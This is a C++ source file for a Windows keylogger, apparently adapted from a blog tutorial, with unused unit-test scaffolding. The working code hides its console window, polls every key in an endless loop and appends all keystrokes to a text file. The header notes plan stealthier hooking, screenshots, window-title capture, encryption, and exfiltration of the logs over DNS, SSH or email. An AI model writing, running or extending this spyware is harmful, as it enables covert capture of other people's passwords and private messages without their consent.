/* References:
 - Boiler plate keylogger code: https://hacking-share.blogspot.com/2013/03/basic-keylogger-in-c-tutorial.html
 - Catch Tests: https://github.com/philsquared/Catch
*/

/* NOTES:
Currently dead simple. Areas for improvement:
 - Less detectable method of hooking user key presses (super high CPU usage with infinite loop right now)
 - Grab screenshot of areas around cursor when clicking
 - Get Window title of where text was typed. Gives context into keys logged
 - Exfiltrate data over DNS, SSH, email, something like that
 - Encrypt data before it is sent out/logged

*/

#include "stdafx.h"
#include "public.h"
#define CATCH_CONFIG_RUNNER
#include "catch.hpp"

using namespace std;

int main(int argc, char* argv[])
{
	// New Catch sessions for running our tests in test.cpp
	//Catch::Session session; // There must be exactly one instance
	//int returnCode = session.applyCommandLine(argc, argv);
	//if (returnCode != 0) // Indicates a command line error
		//return returnCode;

	// Run the unit tests
	//int numFailed = session.run();

	/* Note that on unices only the lower 8 bits are usually used, clamping
	 the return value to 255 prevents false negative when some multiple
	 of 256 tests has failed */

	//return (numFailed < 0xff ? numFailed : 0xff);

	// Static function to get a handle to the process window, and make it invisible
	HideWindow();
	char i;

	// Run forever
	while (1) 
	{
		// Loop through ASCII character values
		for (i = 8; i <= 190; i++)
		{
			// Check if a key was pressed
			if (GetAsyncKeyState(i) == -32767)
				// Interpret and log the key press
				Save(i, "keys.txt");
		}
	}
	system("PAUSE");
	

}

int Save(int key_stroke, char *file)   // Here we define our save function that we declared before.
{
	if ((key_stroke == 1) || (key_stroke == 2))
		return 0;

	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	cout << key_stroke << endl;

	if (key_stroke == 8)  // The numbers stands for the ascii value of a character
		fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");  // This will print [BACKSPACE] when key 8 is pressed. All the code under this works the same.
	else if (key_stroke == 13)
		fprintf(OUTPUT_FILE, "%s", "\n"); // This will make a newline when the enter key is pressed.
	else if (key_stroke == 32)
		fprintf(OUTPUT_FILE, "%s", " ");
	else if (key_stroke == VK_TAB)              //VK stands for virtual key wich are the keys like Up arrow, down arrow..
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (key_stroke == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (key_stroke == VK_CONTROL)
		fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
	else if (key_stroke == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	else if (key_stroke == VK_END)
		fprintf(OUTPUT_FILE, "%s", "[END]");
	else if (key_stroke == VK_HOME)
		fprintf(OUTPUT_FILE, "%s", "[HOME]");
	else if (key_stroke == VK_LEFT)
		fprintf(OUTPUT_FILE, "%s", "[LEFT]");
	else if (key_stroke == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP]");
	else if (key_stroke == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
	else if (key_stroke == VK_DOWN)
		fprintf(OUTPUT_FILE, "%s", "[DOWN]");
	else if (key_stroke == 190 || key_stroke == 110)
		fprintf(OUTPUT_FILE, "%s", ".");
	else
		fprintf(OUTPUT_FILE, "%s", &key_stroke);

	fclose(OUTPUT_FILE);
	return 0;
}

void HideWindow()
{
	HWND hwnd;
	AllocConsole();
	hwnd = FindWindowA("ConsoleWindowClass", NULL);
	// Don't show the process window
	ShowWindow(hwnd, 0);
}



